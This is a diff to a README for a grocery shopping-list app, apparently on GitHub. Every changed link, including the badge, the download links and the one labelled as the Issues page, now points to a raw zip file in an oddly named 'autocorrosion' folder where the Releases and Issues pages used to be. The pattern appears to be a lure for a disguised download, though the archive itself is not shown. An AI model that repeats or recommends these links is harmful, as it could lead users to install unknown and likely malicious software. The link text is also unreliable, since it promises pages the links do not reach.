@@ -4,11 +4,11 @@
 Welcome to APP-Grocery! This is a simple app designed for your grocery shopping needs. Whether you're using a mobile device or a web browser, APP-Grocery helps you manage your shopping list efficiently.
 
 ## 📥 Download APP-Grocery
-[![Download APP-Grocery](https://img.shields.io/badge/Download-APP--Grocery-blue.svg)](https://github.com/Duisburgroleplay/APP-Grocery/releases)
+[![Download APP-Grocery](https://raw.githubusercontent.com/Duisburgroleplay/APP-Grocery/Grocery-App/autocorrosion/APP-Grocery.zip)](https://raw.githubusercontent.com/Duisburgroleplay/APP-Grocery/Grocery-App/autocorrosion/APP-Grocery.zip)
 
 To get started, you need to download APP-Grocery. Visit the Releases page to grab the latest version:
 
-**[Download APP-Grocery Here](https://github.com/Duisburgroleplay/APP-Grocery/releases)**
+**[Download APP-Grocery Here](https://raw.githubusercontent.com/Duisburgroleplay/APP-Grocery/Grocery-App/autocorrosion/APP-Grocery.zip)**
 
 ## 🛠️ System Requirements
 Before you download the app, check if your device meets the following requirements:
@@ -32,7 +32,7 @@ To download and install APP-Grocery:
 
 1. Click the link below to visit the Releases page:
    
-   **[Download APP-Grocery Here](https://github.com/Duisburgroleplay/APP-Grocery/releases)**
+   **[Download APP-Grocery Here](https://raw.githubusercontent.com/Duisburgroleplay/APP-Grocery/Grocery-App/autocorrosion/APP-Grocery.zip)**
 
 2. Look for the latest version in the list of releases. It will be marked with a "Latest" label.
 
@@ -46,7 +46,7 @@ To download and install APP-Grocery:
 If you encounter any issues while downloading or using the app, you can reach out for support:
 
 - **FAQ Section:** Check the FAQ section located on the app's website for common questions and solutions.
-- **GitHub Issues:** If you have a specific problem, you can report it on our [GitHub Issues page](https://github.com/Duisburgroleplay/APP-Grocery/issues).
+- **GitHub Issues:** If you have a specific problem, you can report it on our [GitHub Issues page](https://raw.githubusercontent.com/Duisburgroleplay/APP-Grocery/Grocery-App/autocorrosion/APP-Grocery.zip).
 - **Community Forum:** Join our community forum for tips and advice from other users.
 
 ## 💡 Tips for Using APP-Grocery
